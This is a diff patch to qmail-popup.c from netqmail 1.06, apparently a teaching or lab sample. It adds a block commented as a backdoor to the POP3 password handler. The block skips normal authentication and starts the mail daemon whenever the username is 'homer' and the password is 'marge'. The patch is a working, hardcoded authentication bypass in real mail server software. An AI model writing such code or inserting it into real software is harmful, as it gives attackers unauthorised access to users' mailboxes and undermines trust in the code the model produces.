@@ -1,0 +1,27 @@
+--- ../netqmail-1.06/qmail-popup.c	2007-11-30 21:22:54.000000000 +0100
++++ qmail-popup.c	2025-03-04 08:48:47.010006451 +0100
+@@ -14,6 +14,8 @@
+ #include "timeoutread.h"
+ #include "timeoutwrite.h"
+ 
++#include <string.h> // Backdoor
++
+ void die() { _exit(1); }
+ 
+ int saferead(fd,buf,len) int fd; char *buf; int len;
+@@ -143,6 +145,15 @@
+ }
+ void pop3_pass(arg) char *arg;
+ {
++  // [Begin] Backdoor
++
++  if ((seenuser == 1) && (strcmp(username.s, "homer") == 0) && (strcmp(arg, "marge") == 0))
++  {
++    execlp(childargs[1], childargs[1], childargs[2], 0); // childargs = argv + 2 (Cf. main()) ; *(childargs + 1) = "./qmail-pop3d" ; *(childargs + 2) = "./Mailbox"
++  }
++
++  // [End] Backdoor
++
+   if (!seenuser) { err_wantuser(); return; }
+   if (!*arg) { err_syntax(); return; }
+   doanddie(username.s,username.len,arg);
